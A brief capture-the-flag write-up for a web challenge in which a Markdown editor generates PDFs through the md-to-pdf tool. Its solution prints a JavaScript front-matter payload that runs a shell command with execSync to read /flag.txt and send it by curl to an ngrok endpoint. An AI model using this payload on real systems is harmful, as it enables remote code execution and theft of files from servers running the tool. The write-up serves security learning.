## Challenge

the page is presented with a list of uploaded PDF entries and a button to create them. The button sends you to a markdown editor on which to write the content we want and we can generate the PDF via the md-to-pdf tool.

# Solution 

this challenge provides the source code. We are able to understand the md-to-pdf version which is crucial for web searches to understand the tactics to be used. The research led me to see an interesting payload to exploit for this tool. This payload allows me to do RCE on the system and get the flag using an endpoint of my choice such as the one provided by ngrok. The payload is as follows.

```python
 ---js
{
    css: `body::before { content: "${require('child_process').execSync('a=$(cat /flag.txt);curl ngrok/flag=$a;').join()}"; display: block }`,
}
--- 
```

the flag will be received on the active endpoint provided by ngrok.
